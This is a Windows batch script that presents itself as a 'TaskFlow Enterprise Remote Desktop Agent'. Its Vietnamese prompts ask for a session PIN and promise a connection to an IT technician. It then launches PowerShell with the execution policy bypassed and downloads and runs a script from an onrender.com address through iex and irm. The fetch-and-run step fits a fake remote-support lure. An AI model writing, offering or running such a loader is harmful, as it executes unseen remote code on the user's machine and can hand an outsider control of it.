@echo off
chcp 65001 >nul
title TaskFlow Remote Desktop Agent
color 0B
echo ============================================================
echo       TASKFLOW ENTERPRISE REMOTE DESKTOP AGENT v2.0
echo ============================================================
echo.
set /p PIN="Vui long nhap Ma Phien hoac PIN 6 so: "
echo.
echo Dang khoi dong va ket noi toi Ky thuat vien IT...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $s='%PIN%'; $h='https://baodh.onrender.com'; iex (irm 'https://baodh.onrender.com/public/agent/TaskFlow-Agent.ps1')"
pause
